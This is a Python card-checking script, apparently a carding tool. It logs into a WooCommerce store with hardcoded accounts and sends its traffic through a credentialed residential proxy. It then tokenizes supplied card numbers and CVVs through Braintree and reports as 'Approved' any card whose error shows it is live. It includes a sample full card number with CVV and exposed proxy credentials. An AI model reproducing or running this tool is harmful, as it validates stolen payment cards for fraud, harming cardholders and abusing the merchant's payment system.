import secrets
import uuid
import names
import base64
import random
import base64
from requests import Session
from dataclasses import dataclass



@dataclass
class BehaviorsBraintree:

    def ResponseHtml(self, response:str=None):   
        if   'avs_and_cvv' in response:                             return 'Approved! ✅', response
        elif 'cvv: Gateway Rejected: cvv' in response:              return 'Approved! ✅', response
        elif 'Insufficient Funds' in response:                      return 'Approved! ✅', response
        elif 'avs: Gateway Rejected: avs' in response:              return 'Approved! ✅', response
        elif 'CVV.' in response:                                    return 'Approved! ✅', response
        elif 'Card Issuer Declined CVV' in response:                return 'Approved! ✅', response
        elif 'Invalid postal code and cvv' in response:             return 'Approved! ✅', response
        elif 'Nice! New payment method added' in response:          return 'Approved! ✅', response
        elif 'Payment method successfully added.' in response:      return 'Approved! ✅', response
        elif 'Invalid postal code or street address' in response:   return 'Approved! ✅', response 
        elif 'Duplicate card exists in the vault.' in response: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
        else:                                                       return 'Declined! ❌', response

    def SaveResponseHhml(self, response:str):
        with open("ResponseHhml.html", "w", encoding="utf-8") as f:
            f.write(response)

    def SessionId(self):
        self.id = str(uuid.uuid4())
        return self.id

    def Ccs(self, cards:str=None):
        if '|' in cards: 
            return cards.split('|')
        elif ':' in cards: 
            return cards.split(':')
        elif ',' in cards: 
            return cards.split(',')
        elif '-' in cards: return cards.split('-')

        return cards


    @classmethod
    def QueryText(self, data:str = None, chainOne:str = None, chainTwo:str = None):

        self.uophs = data[ data.index(chainOne) + len (chainOne):data.index(chainTwo,  data.index(chainOne) + len (chainOne))]
        try:
            return self.uophs
        
        except: 
            return 'value not found' 
    
    @classmethod    
    def RandomName(self,dato:str=None):
        if dato == 'username': 
            self.username = "{}{}{}".format(
                    names.get_first_name(),
                    names.get_last_name(),
                    random.randint(1000000,9999999)
                    )
            return self.username
         
        elif dato == 'email': 
            self.email = "{}{}{}@gmail.com".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.email
        
        elif dato == 'password': 
            self.password = "{}{}#{}".format(
                names.get_first_name(),
                names.get_last_name(),
                random.randint(1000000,9999999)
            )
            return self.password
        
        elif dato == 'numero':
            self.number = ''.join([str(random.randint(0, 9)) for _ in range(10)])
            return self.number
        
        else:
            return 'valores incorrectos: >>>   BehaviorsBraintree().RandomName("username")'


    @classmethod
    def DecodeBear(self, dato:str = None):
        self._tokenEncoding = base64.b64decode(dato).decode('utf-8') 
        self.bear_end = BehaviorsBraintree().QueryText(
            self._tokenEncoding, 
            '"authorizationFingerprint":"',  
            '","')

        return self.bear_end
    
correlationid = secrets.token_hex(16)


    
class heven:
    def main(self,ccs):
        try:
            self.UseMail = BehaviorsBraintree().RandomName('email')
            self.Nombre = BehaviorsBraintree().RandomName('username')
            
            user = ['jose.campo2983verde@gmail.com','josec.ampo2983verde@gmail.com','j.o.secampo2983verde@gmail.com','j.o.s.ecampo2983verde@gmail.com','j.o.s.e.campo2983verde@gmail.com','j.os.ecampo2983verde@gmail.com','josecampo2983verd.e@gmail.com','j.os.ec.am.po2983verde@gmail.com','j.o.s.ec.am.po2983verde@gmail.com','jo.seca.m.po2983verde@gmail.com',]
            usernames = random.choice(user)

            self.session = Session()
            self.session.proxies.update({"http://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060","https://": "http://5lsbptwhow0s8kt-country-us:qcok25i88ff4ers@rp.scrapegw.com:6060",})
            
            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'none','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_1 = self.session.get('https://identityfashion.online/my-account/', headers=headers)
            self.nonce_login = BehaviorsBraintree().QueryText(self.req_1.text,'name="woocommerce-login-nonce" value="','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://identityfashion.online','priority': 'u=0, i','referer': 'https://identityfashion.online/my-account/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'username': usernames,'password': 'Regalo2001','woocommerce-login-nonce': self.nonce_login,'_wp_http_referer': '/my-account/','login': 'Log in',}
            self.session.post('https://identityfashion.online/my-account/', headers=headers, data=data)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','priority': 'u=0, i','referer': 'https://identityfashion.online/my-account/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.session.get('https://identityfashion.online/my-account/', headers=headers)

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','priority': 'u=0, i','referer': 'https://identityfashion.online/my-account/payment-methods/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            self.req_2 = self.session.get('https://identityfashion.online/my-account/add-payment-method/', headers=headers)
            self.payment_nonce = BehaviorsBraintree().QueryText(self.req_2.text,'name="woocommerce-add-payment-method-nonce" value="','"')
            self.client_token_nonce = BehaviorsBraintree().QueryText(self.req_2.text,'"client_token_nonce":"','"')

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','content-type': 'application/x-www-form-urlencoded; charset=UTF-8','origin': 'https://identityfashion.online','priority': 'u=1, i','referer': 'https://identityfashion.online/my-account/add-payment-method/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'same-origin','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36','x-requested-with': 'XMLHttpRequest',}
            data = {'action': 'wc_braintree_credit_card_get_client_token','nonce': self.client_token_nonce,}
            self.req_3 = self.session.post('https://identityfashion.online/wp-admin/admin-ajax.php', headers=headers, data=data)
            self.data_J = self.req_3.json()['data']
            self.client_eyj = BehaviorsBraintree().DecodeBear(self.data_J)
            self.session_client_id = BehaviorsBraintree().SessionId()
            self.ccs = BehaviorsBraintree().Ccs(ccs)

            headers = {'accept': '*/*','accept-language': 'es-419,es;q=0.9,en;q=0.8','authorization': f'Bearer {self.client_eyj}','braintree-version': '2018-05-10','content-type': 'application/json','origin': 'https://assets.braintreegateway.com','priority': 'u=1, i','referer': 'https://assets.braintreegateway.com/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'empty','sec-fetch-mode': 'cors','sec-fetch-site': 'cross-site','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            json_data = {'clientSdkMetadata': {'source': 'client','integration': 'custom','sessionId': self.session_client_id,},'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }','variables': {'input': {'creditCard': {'number': self.ccs[0],'expirationMonth': self.ccs[1],'expirationYear': self.ccs[2],'cvv': self.ccs[3],},'options': {'validate': False,},},},'operationName': 'TokenizeCreditCard',}
            self.req_4 = self.session.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
            self.token_card = BehaviorsBraintree().QueryText(self.req_4.text,'{"token":"','"')

            headers = {'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'es-419,es;q=0.9,en;q=0.8','cache-control': 'max-age=0','content-type': 'application/x-www-form-urlencoded','origin': 'https://identityfashion.online','priority': 'u=0, i','referer': 'https://identityfashion.online/my-account/add-payment-method/','sec-ch-ua': '"Chromium";v="134", "Not:A-Brand";v="24", "Google Chrome";v="134"','sec-ch-ua-mobile': '?0','sec-ch-ua-platform': '"Windows"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36',}
            data = {'payment_method': 'braintree_credit_card','wc-braintree-credit-card-card-type': 'visa','wc-braintree-credit-card-3d-secure-enabled': '','wc-braintree-credit-card-3d-secure-verified': '','wc-braintree-credit-card-3d-secure-order-total': '13.98','wc_braintree_credit_card_payment_nonce': self.token_card,'wc_braintree_device_data': '{"correlation_id":"' +correlationid+ '"}','wc-braintree-credit-card-tokenize-payment-method': 'true','woocommerce-add-payment-method-nonce': self.payment_nonce,'_wp_http_referer': '/my-account/add-payment-method/','woocommerce_add_payment_method': '1',}
            self.req_5 = self.session.post('https://identityfashion.online/my-account/add-payment-method/', headers=headers, data=data,)
            self.session.close()

            if 'Nice! New payment method' in self.req_5.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
            elif "81724: Duplicate card exists in the vault." in self.req_5.text: return 'Approved! ✅', '1000: Approved','Nice! New payment method'
        
            error = BehaviorsBraintree().QueryText(self.req_5.text, 'class="woocommerce-error" role="alert">', '</li>').split('<li>')
            
            if error[1] == '\n\t\t\t\t\t': return 'Approved! ✅', '1000: Approved'
            else:
                
                return BehaviorsBraintree().ResponseHtml(error[1].split('Status code ')[1].strip())
            
        except: return 'Declined! ❌',' Gateway Rejected: risk_threshold'
        

if __name__ == '__main__':
    print(heven().main('4426441313931192|10|2028|818'))
 